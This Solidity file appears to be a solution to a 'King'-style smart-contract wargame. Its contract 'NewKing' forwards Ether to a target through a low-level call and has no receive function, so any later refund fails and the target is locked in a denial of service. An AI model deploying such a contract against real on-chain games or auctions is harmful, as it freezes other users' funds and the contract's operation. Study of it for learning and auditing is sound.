// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

contract NewKing {
    function Attack(address _to) public payable {
        // Check if the function call includes Ether
        require(msg.value > 0, "No Ether provided for transfer");

        // Transfer the Ether from the sender to the specified address
        // _to.transfer(msg.value); -> can't use it because capped in gas, same for send
        (bool sent, ) = _to.call{value: msg.value}("");
        require(sent, "Failed to send value!");
    }
}
